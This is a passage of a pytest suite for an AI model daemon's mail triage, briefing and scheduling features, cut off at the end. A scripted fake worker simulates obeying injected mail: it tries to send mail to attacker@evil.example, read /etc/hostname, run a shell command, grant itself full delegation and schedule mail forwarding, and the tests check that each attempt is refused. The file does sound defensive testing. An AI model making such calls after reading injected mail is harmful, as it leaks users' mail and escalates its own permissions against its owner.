"""M19 WP8: the assistant features - presets, briefings, assistant tasks, mail triage.

Every daemon runs on a throwaway home with a scripted provider and a fake mail
MCP server (``fixtures/mcp/mail_server.py``); nothing reaches Google, Microsoft
or a model.  The catalog's real presets are checked for shape only.
"""

from __future__ import annotations

import asyncio
import json
import sys
from datetime import timedelta
from pathlib import Path
from typing import Any

import aiohttp
import pytest
import pytest_asyncio
from _support import connect, make_daemon
from aiohttp import web

from snowpea_core.config.credentials import CredentialStore
from snowpea_core.jarvis import briefing, presets
from snowpea_core.jarvis import tools as jarvis_tools
from snowpea_core.providers.base import ChatMessage, StreamEvent, ToolCall, Usage
from snowpea_core.scheduler.jobs import utc_now
from snowpea_core.server.protocol import CAPABILITIES, PENDING_CAPABILITIES
from snowpea_core.session.history import message_text
from snowpea_core.tools import mcp_catalog, mcp_client, mcp_config
from snowpea_core.tools.registry import ToolContext

MAIL_SERVER = Path(__file__).parent / "fixtures" / "mcp" / "mail_server.py"


@pytest_asyncio.fixture(autouse=True)
async def _stop_servers() -> Any:
    mcp_client.MANAGER.listeners = []
    yield
    await mcp_client.MANAGER.close_all()
    mcp_client.MANAGER.listeners = []


def _mail_server(suffix: str = "mail") -> dict[str, Any]:
    return {
        "suffix": suffix,
        "title": "Fake mail",
        "kind": "mail",
        "transport": "stdio",
        "auth": "none",
        "entry": {
            "command": sys.executable,
            "args": [str(MAIL_SERVER), "{MAIL_LOG}"],
            "env": {"FAKE_SECRET": "${FAKE_API_SECRET}"},
        },
        "readTools": ["search_threads", "get_thread", "list_labels"],
        "sendTools": ["create_draft", "send_mail"],
    }


def _inputs() -> list[dict[str, Any]]:
    return [
        {"name": "MAIL_LOG", "label": "log", "secret": False, "required": True, "placeholder": ""},
        {
            "name": "FAKE_API_SECRET",
            "label": "secret",
            "secret": True,
            "required": False,
            "placeholder": "",
        },
    ]


def _recipe() -> dict[str, Any]:
    return {
        "id": "mail-digest",
        "title": "Mail digest",
        "schedule": "0 8 * * 1-5",
        "kind": "mail",
        "server": "mail",
        "prompt": "Summarise the new mail.",
        "defaultEnabled": False,
    }


def _preset(preset_id: str, servers: list[dict[str, Any]]) -> dict[str, Any]:
    return {
        "id": preset_id,
        "title": preset_id,
        "description": "fake",
        "category": "mail",
        "homepage": "",
        "inputs": _inputs(),
        "servers": servers,
        "recipes": [_recipe()],
    }


@pytest.fixture
def fake_presets(monkeypatch: pytest.MonkeyPatch) -> None:
    bad = {
        "suffix": "dead",
        "title": "Dead",
        "kind": "mail",
        "transport": "http",
        "auth": "none",
        "entry": {"url": "http://127.0.0.1:9/mcp"},
        "readTools": ["x"],
        "sendTools": [],
    }
    oauth = {
        "suffix": "cal",
        "title": "Needs sign-in",
        "kind": "calendar",
        "transport": "http",
        "auth": "oauth",
        "entry": {"url": "{AUTH_URL}", "oauth": {"clientId": "cid-123"}},
        "readTools": ["list_events"],
        "sendTools": ["create_event"],
    }
    fakes = (
        _preset("fakemail", [_mail_server()]),
        _preset("fakebad", [_mail_server("good"), bad]),
        {
            **_preset("fakeauth", [oauth]),
            "inputs": [
                {
                    "name": "AUTH_URL",
                    "label": "url",
                    "secret": False,
                    "required": True,
                    "placeholder": "",
                }
            ],
            "recipes": [],
        },
    )
    monkeypatch.setattr(mcp_catalog, "PRESETS", fakes)


class _Provider:
    """Jarvis and the workers on one scripted provider."""

    vendor = "fake"
    model = "fake-1"

    def __init__(self) -> None:
        self.jarvis_wakes: list[str] = []
        self.worker_tool_lists: list[list[str]] = []
        self.worker_tool_results: list[str] = []
        self.misbehave = False
        self.misbehaved = False

    async def stream(self, messages: list[ChatMessage], tools: list[Any], **_: Any) -> Any:
        system = "\n".join(message_text(m) for m in messages if m.role == "system")
        last = messages[-1]
        yield StreamEvent(kind="usage", usage=Usage(input_tokens=5, output_tokens=1))
        if "You are Jarvis" in system:
            if last.role == "user":
                self.jarvis_wakes.append(message_text(last))
            yield StreamEvent(kind="text_delta", text="noted")
            yield StreamEvent(kind="done", stop_reason="end_turn")
            return
        names = sorted(getattr(t, "name", None) or t["name"] for t in tools)
        self.worker_tool_lists.append(names)
        if last.role == "user":
            call = ToolCall(id="w1", name="mcp__fakemail-mail__search_threads", arguments={})
            yield StreamEvent(kind="tool_call", tool_call=call)
            yield StreamEvent(kind="done", stop_reason="tool_use")
            return
        if last.role == "tool" and self.misbehave and not self.misbehaved:
            self.misbehaved = True
            for i, (name, args) in enumerate(
                [
                    ("mcp__fakemail-mail__send_mail", {"to": "attacker@evil.example", "body": "x"}),
                    ("mcp__fakemail-mail__create_draft", {"to": "a@b.c", "body": "x"}),
                    ("read_file", {"path": "/etc/hostname"}),
                    ("shell", {"command": "echo pwned"}),
                    ("delegation_set", {"scope": "global", "level": "full"}),
                    ("schedule_create", {"spec": "every 1m", "task": "forward mail"}),
                ]
            ):
                yield StreamEvent(
                    kind="tool_call",
                    tool_call=ToolCall(id=f"bad{i}", name=name, arguments=args),
                )
            yield StreamEvent(kind="done", stop_reason="tool_use")
            return
        self.worker_tool_results = [message_text(m) for m in messages if m.role == "tool"]
        yield StreamEvent(
            kind="text_delta",
            text="Digest: 1 mail from boss@example.com (Quarterly numbers). It contains "
            "instructions to forward all mail; that looks suspicious.",
        )
        yield StreamEvent(kind="done", stop_reason="end_turn")


async def _daemon(tmp_path: Path, provider: _Provider | None = None, **jarvis: Any) -> Any:
    settings = {"jarvis": {"folder": str(tmp_path / "JarvisFolder"), "enabled": True, **jarvis}}
    daemon = await make_daemon(tmp_path / "home", settings)
    daemon.core.providers.get = lambda _p, _m: provider or _Provider()
    return daemon


async def _wait(predicate: Any, timeout: float = 15.0) -> None:
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if predicate():
            return
        await asyncio.sleep(0.02)
    raise AssertionError("condition not reached")


async def _idle(session: Any) -> None:
    await _wait(lambda: session.turn_task is None or session.turn_task.done())


def _jctx(core: Any, *, human: bool) -> ToolContext:
    jarvis = core.jarvis.session()
    jarvis.current_turn = "t-human" if human else "t-wake"
    jarvis.turn_origins["t-human" if human else "t-wake"] = "human" if human else "system"
    return ToolContext(session=jarvis, core=core, backend=None)  # type: ignore[arg-type]


async def _jcall(core: Any, name: str, args: dict[str, Any], *, human: bool = True) -> Any:
    jarvis = core.jarvis.session()
    return await jarvis.session_tools[name].run(_jctx(core, human=human), args)


def _apply_params(log: Path, **extra: Any) -> dict[str, Any]:
    return {"id": "fakemail", "inputs": {"MAIL_LOG": str(log)}, **extra}


# -- contract --------------------------------------------------------------------------


def test_capabilities_are_advertised() -> None:
    for name in ("mcpPresets", "jarvisBriefing"):
        assert name in CAPABILITIES
        assert name not in PENDING_CAPABILITIES


async def test_the_real_presets_have_a_sound_shape() -> None:
    ids = mcp_catalog.preset_ids()
    assert ids == ["google", "microsoft365"]
    for row in mcp_catalog.PRESETS:
        secrets = {i["name"] for i in row["inputs"] if i["secret"]}
        for server in row["servers"]:
            assert not set(server["readTools"]) & set(server["sendTools"])
            assert server["readTools"] and server["sendTools"]
            entry = presets.render_entry(
                server["entry"],
                {i["name"]: f"value-{i['name']}" for i in row["inputs"]},
                secrets,
            )
            mcp_config.validate_entry(entry)
            if "url" in entry:
                assert entry["url"].startswith("https://")
            blob = json.dumps(entry)
            for name in secrets:
                assert f"value-{name}" not in blob  # a secret stays a ${NAME} reference
                assert f"${{{name}}}" in blob
        for recipe in row["recipes"]:
            assert recipe["kind"] in ("mail", "calendar")
            assert not recipe["defaultEnabled"]  # nothing is scheduled unasked
    # Google: two servers, official endpoints, no send tool at all on Gmail.
    google = mcp_catalog.preset("google")
    urls = [s["entry"]["url"] for s in google["servers"]]
    assert urls == [
        "https://gmailmcp.googleapis.com/mcp/v1",
        "https://calendarmcp.googleapis.com/mcp/v1",
    ]
    ms = mcp_catalog.preset("microsoft365")["servers"][0]
    assert any(a.startswith("@softeria/ms-365-mcp-server@0.") for a in ms["entry"]["args"])
    assert "send-mail" in ms["sendTools"] and "send-mail" not in ms["readTools"]
    assert set(ms["workerTools"]["mail"]).isdisjoint({"get-calendar-view"})
    # Optional inputs left empty leave no key behind.
    bare = presets.render_entry(ms["entry"], {}, set())
    assert "env" not in bare
    tenant = presets.render_entry(ms["entry"], {"MS365_MCP_TENANT_ID": "consumers"}, set())
    assert tenant["env"] == {"MS365_MCP_TENANT_ID": "consumers"}


# -- presets ---------------------------------------------------------------------------


async def test_list_apply_is_idempotent_and_tags_the_tools(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        listed = (await client.ok("mcp.preset.list", {}))["presets"]
        assert [p["id"] for p in listed] == ["fakemail", "fakebad", "fakeauth"]
        assert not any(p["applied"] for p in listed)

        first = await client.ok(
            "mcp.preset.apply",
            _apply_params(
                log,
                recipes=["mail-digest"],
                inputs={"MAIL_LOG": str(log), "FAKE_API_SECRET": "s3cret"},
            ),
        )
        assert first["server"] == "fakemail-mail" and first["servers"] == ["fakemail-mail"]
        assert first["already"] is False and first["needsAuth"] is False
        assert len(first["jobs"]) == 1
        assert "s3cret" not in json.dumps(first)
        # Tags: reading runs unasked, everything else asks.
        tools = (
            {t.name: t for t in core.tools.list_registered()}
            if hasattr(core.tools, "list_registered")
            else {}
        )
        read = core.tools.get("mcp__fakemail-mail__search_threads")
        send = core.tools.get("mcp__fakemail-mail__send_mail")
        draft = core.tools.get("mcp__fakemail-mail__create_draft")
        assert read is not None and read.permission == "read"
        assert send is not None and send.permission == "send"
        assert draft is not None and draft.permission == "send"
        del tools
        table = core.settings.mcp.permissions
        assert table["fakemail-mail"] == "send"
        assert table["fakemail-mail/search_threads"] == "read"
        # The secret lives in credentials.json; the entry only refers to it.
        assert CredentialStore(core.paths).load()["FAKE_API_SECRET"] == "s3cret"
        entry = mcp_config.read_servers(core.paths.home / ".mcp.json")["fakemail-mail"]
        assert entry["env"] == {"FAKE_SECRET": "${FAKE_API_SECRET}"}
        assert "s3cret" not in (core.paths.home / ".mcp.json").read_text()
        job = await core.scheduler.get(first["jobs"][0])
        assert job.target == "jarvis-task" and job.target_data["kind"] == "mail"
        assert job.target_data["tools"] == [
            "mcp__fakemail-mail__search_threads",
            "mcp__fakemail-mail__get_thread",
            "mcp__fakemail-mail__list_labels",
        ]
        assert (await core.scheduler.get(job.id)).spec == "0 8 * * 1-5"

        # Same call again: nothing changes, no second job.
        before = (core.paths.home / ".mcp.json").read_text()
        again = await client.ok(
            "mcp.preset.apply",
            _apply_params(
                log,
                recipes=["mail-digest"],
                inputs={"MAIL_LOG": str(log), "FAKE_API_SECRET": "s3cret"},
            ),
        )
        assert again["already"] is True
        assert (core.paths.home / ".mcp.json").read_text() == before
        assert len([j for j in await core.scheduler.list() if j.target == "jarvis-task"]) == 1

        listed = (await client.ok("mcp.preset.list", {}))["presets"]
        assert next(p for p in listed if p["id"] == "fakemail")["appliedServers"] == [
            "fakemail-mail"
        ]
    finally:
        await daemon.stop()


async def test_apply_validates_before_touching_anything(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        for params in (
            {"id": "nope", "inputs": {}},
            {"id": "fakemail", "inputs": {}},  # MAIL_LOG missing
            {"id": "fakemail", "inputs": {"MAIL_LOG": "x", "WHAT": "y"}},
            {"id": "fakemail", "inputs": {"MAIL_LOG": "x"}, "recipes": ["nope"]},
            {"id": "fakemail", "inputs": {"MAIL_LOG": "x"}, "scope": "project"},
        ):
            frame = await client.call("mcp.preset.apply", params)
            assert frame.get("error"), params
        assert not (core.paths.home / ".mcp.json").exists()
        assert presets.load_book(core) == {}
    finally:
        await daemon.stop()


async def test_a_failed_apply_leaves_nothing_behind(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        # A permission and a credential that existed before must survive the failure.
        CredentialStore(core.paths).set("FAKE_API_SECRET", "old")
        frame = await client.call(
            "mcp.preset.apply",
            {
                "id": "fakebad",
                "inputs": {"MAIL_LOG": str(log), "FAKE_API_SECRET": "new"},
                "recipes": ["mail-digest"],
            },
        )
        assert frame.get("error"), frame
        assert not (core.paths.home / ".mcp.json").exists() or not mcp_config.read_servers(
            core.paths.home / ".mcp.json"
        )
        assert {k for k in core.settings.mcp.permissions if k.startswith("fakebad")} == set()
        assert CredentialStore(core.paths).load()["FAKE_API_SECRET"] == "old"
        assert [j for j in await core.scheduler.list() if j.target == "jarvis-task"] == []
        assert presets.load_book(core) == {}
        assert core.tools.get("mcp__fakebad-good__search_threads") is None
        assert mcp_client.MANAGER.get("fakebad-good") is None
    finally:
        await daemon.stop()


async def test_remove_restores_the_previous_state(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        # Previous state: an unrelated server and a tag of its own, a stored secret.
        mcp_config.save_entry(
            core.paths.home / ".mcp.json", "other", {"command": sys.executable, "args": ["-c", "1"]}
        )
        await presets._write_permissions(core, {"other": "network"})
        CredentialStore(core.paths).set("FAKE_API_SECRET", "old")
        permissions_before = dict(core.settings.mcp.permissions)
        await client.ok(
            "mcp.preset.apply",
            _apply_params(
                log,
                recipes=["mail-digest"],
                inputs={"MAIL_LOG": str(log), "FAKE_API_SECRET": "new"},
            ),
        )
        assert CredentialStore(core.paths).load()["FAKE_API_SECRET"] == "new"

        removed = await client.ok("mcp.preset.remove", {"id": "fakemail"})
        assert removed["removed"] is True and removed["servers"] == ["fakemail-mail"]
        assert len(removed["jobs"]) == 1
        servers = mcp_config.read_servers(core.paths.home / ".mcp.json")
        assert set(servers) == {"other"}
        assert dict(core.settings.mcp.permissions) == permissions_before
        assert CredentialStore(core.paths).load()["FAKE_API_SECRET"] == "old"
        assert [j for j in await core.scheduler.list() if j.target == "jarvis-task"] == []
        assert core.tools.get("mcp__fakemail-mail__search_threads") is None
        assert (await client.ok("mcp.preset.remove", {"id": "fakemail"}))["removed"] is False

        # A name the person already uses is never taken over.
        mcp_config.save_entry(
            core.paths.home / ".mcp.json",
            "fakemail-mail",
            {"command": sys.executable, "args": ["-c", "1"]},
        )
        frame = await client.call("mcp.preset.apply", _apply_params(log))
        assert frame.get("error") and frame["error"]["data"]["code"] == "mcp_exists"
    finally:
        await daemon.stop()


async def test_apply_reports_what_still_needs_a_sign_in(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    async def unauthorized(_request: web.Request) -> web.Response:
        return web.Response(status=401, headers={"WWW-Authenticate": 'Bearer realm="fake"'})

    app = web.Application()
    app.router.add_route("*", "/mcp", unauthorized)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]  # type: ignore[union-attr]
    daemon = await _daemon(tmp_path)
    try:
        client = await connect(http, daemon)
        result = await client.ok(
            "mcp.preset.apply",
            {"id": "fakeauth", "inputs": {"AUTH_URL": f"http://127.0.0.1:{port}/mcp"}},
        )
        assert result["needsAuth"] is True
        sign_in = result["signIn"][0]
        assert sign_in["server"] == "fakeauth-cal" and sign_in["method"] == "oauth"
        assert "mcp.authorize" in sign_in["note"] and "redirectUri" in sign_in["note"]
        # The entry carries the client id and no secret.
        entry = mcp_config.read_servers(daemon.core.paths.home / ".mcp.json")["fakeauth-cal"]
        assert entry["oauth"] == {"clientId": "cid-123"}
        assert daemon.core.settings.mcp.permissions["fakeauth-cal/list_events"] == "read"
        assert (await client.ok("mcp.preset.remove", {"id": "fakeauth"}))["removed"] is True
    finally:
        await daemon.stop()
        await runner.cleanup()


async def test_read_and_send_tools_are_classified_for_jarvis(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    """A preset's send tools stay in the guarded secret_send class; its read tools do not."""
    from snowpea_core.jarvis.classify import ClassifyRequest, classify

    log = tmp_path / "mail.log"
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        await client.ok("mcp.preset.apply", _apply_params(log))

        def verdict(tool: str) -> Any:
            name = f"mcp__fakemail-mail__{tool}"
            registered = core.tools.get(name)
            assert registered is not None
            return classify(ClassifyRequest(tool=name, tags=(registered.permission,)))

        assert "secret_send" not in verdict("search_threads").guarded
        for tool in ("send_mail", "create_draft"):
            assert "secret_send" in verdict(tool).guarded
    finally:
        await daemon.stop()


# -- briefing ---------------------------------------------------------------------------


async def test_briefing_is_off_until_asked_and_rejects_bad_input(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    daemon = await _daemon(tmp_path)
    try:
        client = await connect(http, daemon)
        off = await client.ok("jarvis.briefing.get", {})
        assert off["enabled"] is False and off["jobId"] is None and off["nextRunAt"] is None
        assert [j for j in await daemon.core.scheduler.list() if j.target] == []
        for bad in (
            {"schedule": "in 10m"},
            {"schedule": "nonsense"},
            {"timezone": "Mars/Base"},
            {"sections": ["mail", "gossip"]},
        ):
            frame = await client.call("jarvis.briefing.set", bad)
            assert frame.get("error"), bad
        assert (await client.ok("jarvis.briefing.get", {}))["enabled"] is False
    finally:
        await daemon.stop()


async def test_briefing_set_get_fire_and_restart(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    provider = _Provider()
    (tmp_path / "proj").mkdir()
    daemon = await _daemon(tmp_path, provider)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        worker = await core.sessions.create(tmp_path / "proj", mode="auto")
        worker.title = "Fix the login bug"
        todo = jarvis_tools.TodoBook(core.jarvis.folder())
        todo.save([{"id": "t-1", "text": "renew the cert", "due": "2026-12-01", "done": False}])

        on = await client.ok(
            "jarvis.briefing.set",
            {
                "enabled": True,
                "schedule": "0 9 * * 1-5",
                "timezone": "Asia/Seoul",
                "instructions": "short, Korean",
                "sections": ["sessions", "waiting", "todos"],
            },
        )
        assert on["enabled"] and on["timezone"] == "Asia/Seoul" and on["jobId"]
        job = await core.scheduler.get(on["jobId"])
        assert job.timezone == "Asia/Seoul" and job.target == "jarvis-task"
        # 09:00 Seoul on a weekday is 00:00 UTC.
        assert job.next_run.hour == 0 and job.next_run.minute == 0 and job.next_run.weekday() < 5
        assert on["nextRunAt"].endswith("T00:00:00Z")

        # Fire it with the clock moved to the scheduled moment.
        jarvis = core.jarvis.session()
        await _idle(jarvis)
        assert await core.scheduler.tick(job.next_run + timedelta(seconds=1)) == 1
        await _wait(lambda: provider.jarvis_wakes)
        await _idle(jarvis)
        wake = provider.jarvis_wakes[-1]
        assert "[briefing]" in wake and "short, Korean" in wake
        assert "Fix the login bug" in wake and "renew the cert" in wake
        assert wake.count('source="briefing ') == 3  # each block in its own fence
        reports = sorted((core.jarvis.folder() / "reports").glob("briefing-*.md"))
        assert len(reports) == 1 and "renew the cert" in reports[0].read_text()
        escalations, _ = core.jarvis.escalations.page(limit=10)
        assert any("briefing" in e["summary"].lower() for e in escalations)
        assert (await core.scheduler.get(job.id)).last_status == "ok"
        # The job moved on to the next weekday.
        assert (await core.scheduler.get(job.id)).next_run > job.next_run
    finally:
        await daemon.stop()

    # A restart keeps the briefing and its job (the settings file is left as it was).
    daemon = await make_daemon(tmp_path / "home")
    daemon.core.providers.get = lambda _p, _m: _Provider()
    try:
        client = await connect(http, daemon)
        again = await client.ok("jarvis.briefing.get", {})
        assert again["enabled"] and again["jobId"] == on["jobId"]
        assert again["instructions"] == "short, Korean" and again["sections"] == [
            "sessions",
            "waiting",
            "todos",
        ]
        off = await client.ok("jarvis.briefing.set", {"enabled": False})
        assert off["enabled"] is False and off["jobId"] is None
        assert await daemon.core.scheduler.get(on["jobId"]) is None
    finally:
        await daemon.stop()


async def test_briefing_tool_needs_the_persons_own_request(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        refused = await _jcall(
            core, "briefing_set", {"enabled": True, "time": "08:30"}, human=False
        )
        assert not refused.ok and "own request" in refused.error
        assert (await briefing.get(core)).enabled is False
        # Reading is fine either way.
        assert (await _jcall(core, "briefing_set", {}, human=False)).ok

        done = await _jcall(
            core,
            "briefing_set",
            {"enabled": True, "time": "08:30", "days": ["mon", "thu"], "timezone": "Asia/Seoul"},
        )
        assert done.ok, done.error
        state = await briefing.get(core)
        assert state.schedule == "30 8 * * 1,4" and state.timezone == "Asia/Seoul"
        # Only the time changes: the days stay.
        await _jcall(core, "briefing_set", {"time": "07:15"})
        assert (await briefing.get(core)).schedule == "15 7 * * 1,4"
        bad = await _jcall(core, "briefing_set", {"time": "25:00"})
        assert not bad.ok
        assert briefing.build_cron("09:05", "weekdays") == "5 9 * * 1-5"
        assert briefing.build_cron("09:05", "daily") == "5 9 * * *"
    finally:
        await daemon.stop()


async def test_the_briefing_covers_mail_through_the_isolated_worker(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    provider = _Provider()
    daemon = await _daemon(tmp_path, provider)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        await client.ok("mcp.preset.apply", _apply_params(log))
        await briefing.set_briefing(core, enabled=True, sections=["mail"])
        job = await briefing._job(core)
        await _idle(core.jarvis.session())
        assert await core.scheduler.tick(job.next_run + timedelta(seconds=1)) == 1
        await _wait(lambda: provider.jarvis_wakes)
        wake = provider.jarvis_wakes[-1]
        assert "Digest: 1 mail from boss@example.com" in wake
        assert "mail digest" in wake and "<untrusted " in wake
        # The worker held exactly the read tools.
        assert provider.worker_tool_lists[0] == sorted(
            f"mcp__fakemail-mail__{t}" for t in ("search_threads", "get_thread", "list_labels")
        )
        assert not log.exists() or log.read_text() == ""
    finally:
        await daemon.stop()


# -- schedule tools ----------------------------------------------------------------------


async def test_schedule_tools_create_change_remove(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    project = tmp_path / "proj"
    project.mkdir()
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        empty = await _jcall(core, "schedule_list", {})
        assert empty.ok and "no assistant tasks" in empty.output

        # A wake message can never change what runs on a schedule.
        refused = await _jcall(
            core, "schedule_create", {"spec": "every day at 9am", "task": "x"}, human=False
        )
        assert not refused.ok and "own request" in refused.error
        assert [j for j in await core.scheduler.list() if j.target] == []

        made = await _jcall(
            core,
            "schedule_create",
            {
                "spec": "매주 금요일 18:00",
                "task": "Summarise this week's commits",
                "title": "Weekly commits",
                "project": str(project),
                "timezone": "Asia/Seoul",
            },
        )
        assert made.ok, made.error
        job = await core.scheduler.get(made.meta["id"])
        assert job.target == "jarvis-task" and job.target_data["kind"] == "task"
        assert job.timezone == "Asia/Seoul" and job.workdir == str(project)
        assert job.origin_session_id is None  # never delivered into Jarvis's own session
        listing = await _jcall(core, "schedule_list", {})
        assert job.id in listing.output and "Weekly commits" in listing.output

        bad_project = await _jcall(
            core, "schedule_create", {"spec": "every 1h", "task": "x", "project": "no-such"}
        )
        assert not bad_project.ok
        bad_spec = await _jcall(core, "schedule_create", {"spec": "whenever", "task": "x"})
        assert not bad_spec.ok

        changed = await _jcall(
            core, "schedule_update", {"id": job.id, "spec": "0 17 * * 5", "title": "Fri commits"}
        )
        assert changed.ok, changed.error
        job = await core.scheduler.get(job.id)
        assert job.cron == "0 17 * * 5" and job.title == "Fri commits"
        paused = await _jcall(core, "schedule_update", {"id": job.id, "enabled": False})
        assert paused.ok and (await core.scheduler.get(job.id)).enabled is False
        resumed = await _jcall(core, "schedule_update", {"id": job.id, "enabled": True})
        assert resumed.ok and (await core.scheduler.get(job.id)).next_run is not None

        # Other jobs are not Jarvis's to touch.
        plain = await core.scheduler.schedule("every 1h", "plain job")
        assert not (await _jcall(core, "schedule_remove", {"id": plain.id})).ok
        assert not (await _jcall(core, "schedule_update", {"id": plain.id, "enabled": False})).ok
        assert plain.id not in (await _jcall(core, "schedule_list", {})).output

        removed = await _jcall(core, "schedule_remove", {"id": job.id})
        assert removed.ok and await core.scheduler.get(job.id) is None
    finally:
        await daemon.stop()


async def test_a_task_runs_in_its_own_worker_and_jarvis_gets_it_fenced(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    provider = _Provider()
    daemon = await _daemon(tmp_path, provider)
    try:
        core = daemon.core
        made = await _jcall(core, "schedule_create", {"spec": "every 1h", "task": "Say hello"})
        job_id = made.meta["id"]
        jarvis = core.jarvis.session()
        await _idle(jarvis)
        await _jcall(core, "schedule_run", {"id": job_id})
        await _wait(lambda: provider.jarvis_wakes)
        await _idle(jarvis)
        wake = provider.jarvis_wakes[-1]
        assert "[scheduled task finished]" in wake and "<untrusted " in wake
        runs = await core.scheduler.store.runs(job_id)
        assert runs and runs[0]["status"] == "ok"
        assert runs[0]["session_id"] and runs[0]["session_id"] != jarvis.id
        reports = list((core.jarvis.folder() / "reports").glob("*.md"))
        assert len(reports) == 1 and reports[0].read_text().lstrip().startswith("<untrusted")
        # The scheduler's own record holds no text of the result.
        log_file = core.paths.jobs_log
        assert not log_file.exists() or "Digest" not in log_file.read_text()
    finally:
        await daemon.stop()


async def test_a_task_does_not_run_while_jarvis_is_off(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        made = await _jcall(core, "schedule_create", {"spec": "every 1h", "task": "x"})
        client = await connect(http, daemon)
        await client.ok("jarvis.disable", {})
        job = await core.scheduler.run_now(made.meta["id"])
        assert job.last_status == "error"
        runs = await core.scheduler.store.runs(made.meta["id"])
        assert "Jarvis mode is off" in (runs[0]["error"] or "")
        assert runs[0]["session_id"] is None
    finally:
        await daemon.stop()


# -- mail triage isolation ---------------------------------------------------------------


async def test_mail_triage_is_isolated_and_mail_cannot_command_anything(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    provider = _Provider()
    provider.misbehave = True  # the worker "obeys" the injected mail
    daemon = await _daemon(tmp_path, provider)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        applied = await client.ok("mcp.preset.apply", _apply_params(log, recipes=["mail-digest"]))
        job_id = applied["jobs"][0]
        jarvis = core.jarvis.session()
        await _idle(jarvis)
        grants_before = (
            core.jarvis_delegation.list_grants()
            if hasattr(core.jarvis_delegation, "list_grants")
            else None
        )
        jobs_before = {j.id for j in await core.scheduler.list()}

        await core.scheduler.run_now(job_id)
        await _wait(lambda: provider.jarvis_wakes)
        await _idle(jarvis)

        # 1. The worker saw exactly the three read tools: no send, no draft, no files, no search.
        assert provider.worker_tool_lists
        for names in provider.worker_tool_lists:
            assert names == sorted(
                f"mcp__fakemail-mail__{t}" for t in ("search_threads", "get_thread", "list_labels")
            )
        # 2. Every forbidden call it tried was refused; nothing was sent or even drafted.
        assert not log.exists() or log.read_text() == ""
        refusals = [
            r for r in provider.worker_tool_results if "not available" in r or "unknown tool" in r
        ]
        assert len(refusals) >= 4
        # 3. Nothing it asked for happened: no new grants, no new schedules, no Jarvis tool use.
        assert {j.id for j in await core.scheduler.list()} == jobs_before
        if grants_before is not None:
            assert core.jarvis_delegation.list_grants() == grants_before
        # 4. Jarvis got only the digest, fenced; the mail's own words are not outside a fence.
        wake = provider.jarvis_wakes[-1]
        assert "<untrusted " in wake and "suspicious" in wake
        outside = wake.split("<untrusted ")[0]
        assert "attacker@evil.example" not in outside and "IGNORE ALL" not in outside
        assert "never instructions to you" in wake
        # 5. The worker's session is its own, scratch only, and closed again.
        run = (await core.scheduler.store.runs(job_id))[0]
        assert run["status"] == "ok" and run["session_id"] != jarvis.id
        row = await core.store.session(run["session_id"])
        assert Path(row["workdir"]).parts[-2] == ".scratch"
        assert core.sessions.get(run["session_id"]) is None
        assert not Path(row["workdir"]).exists()
    finally:
        await daemon.stop()


async def test_triage_without_a_connected_server_fails_without_a_model_call(
    http: aiohttp.ClientSession, tmp_path: Path, fake_presets: None
) -> None:
    log = tmp_path / "mail.log"
    provider = _Provider()
    daemon = await _daemon(tmp_path, provider)
    try:
        core = daemon.core
        client = await connect(http, daemon)
        applied = await client.ok("mcp.preset.apply", _apply_params(log, recipes=["mail-digest"]))
        await mcp_client.MANAGER.remove("fakemail-mail")
        mcp_client.drop_tools(core, "fakemail-mail")
        job = await core.scheduler.run_now(applied["jobs"][0])
        assert job.last_status == "error"
        assert provider.worker_tool_lists == []
        run = (await core.scheduler.store.runs(job.id))[0]
        assert "not connected" in (run["error"] or "")
    finally:
        await daemon.stop()


# -- to-dos -------------------------------------------------------------------------------


async def test_recurring_todos_come_back_after_they_are_done(
    http: aiohttp.ClientSession, tmp_path: Path
) -> None:
    daemon = await _daemon(tmp_path)
    try:
        core = daemon.core
        assert not (await _jcall(core, "todo_add", {"text": "x", "repeat": "weekly"})).ok
        assert not (
            await _jcall(core, "todo_add", {"text": "x", "repeat": "yearly", "due": "2026-01-01"})
        ).ok
        added = await _jcall(
            core, "todo_add", {"text": "water plants", "due": "2026-01-05", "repeat": "weekly"}
        )
        assert added.ok, added.error
        done = await _jcall(core, "todo_done", {"id": added.meta["id"]})
        assert "next due" in done.output
        listing = await _jcall(core, "todo_list", {})
        assert "water plants" in listing.output and "weekly" in listing.output
        item = jarvis_tools.TodoBook(core.jarvis.folder()).load()[0]
        assert item["done"] is False and item["due"] > "2026-01-05"
        # A plain to-do still closes.
        plain = await _jcall(core, "todo_add", {"text": "once", "due": "2026-02-01"})
        await _jcall(core, "todo_done", {"id": plain.meta["id"]})
        assert [
            i for i in jarvis_tools.TodoBook(core.jarvis.folder()).load() if i["text"] == "once"
